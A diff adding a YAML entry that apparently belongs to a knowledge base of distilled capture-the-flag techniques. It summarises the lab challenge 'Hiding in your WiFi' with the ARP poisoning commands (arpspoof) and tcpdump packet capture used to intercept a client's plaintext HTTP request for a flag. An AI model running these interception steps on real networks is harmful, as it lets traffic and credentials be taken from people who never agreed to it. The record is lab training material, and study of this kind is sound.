@@ -1,0 +1,30 @@
+id: devsecoops_devsecoops_hiding_in_your_wifi
+title: devsecoops_Hiding in your WiFi
+category: devsecoops
+fingerprint:
+  file_types: []
+  protections: []
+  tags:
+  - devsecoops
+signals: []
+primitive: Distilled technique from devsecoops_Hiding in your WiFi
+preconditions: []
+strategy:
+- Remote service provides an interactive TLS bash shell as user `player` on `10.10.10.66`.
+- Network contains a web server at `10.10.10.10` and a client at `10.10.10.20` periodically
+  requesting `/flag.txt`.
+- '`cat /proc/sys/net/ipv4/ip_forward` confirmed kernel packet forwarding was enabled
+  (`1`).'
+- 'Executed bidirectional ARP poisoning between client and server:'
+- '`arpspoof -i eth0 -t 10.10.10.20 -r 10.10.10.10 &`'
+- 'Captured plaintext HTTP traffic using:'
+- '`tcpdump -i eth0 -A -n -s 0 -c 40`'
+- 'Intercepted HTTP 200 response from `10.10.10.10` to `10.10.10.20` containing the
+  flag:'
+verification:
+- Check verification logic against recovered constraints
+failure_modes: []
+reusable_snippets: []
+source:
+  challenge_hash: 682caef5253bd5bd
+  learned_at: '2026-09-18T20:13:49.468649'
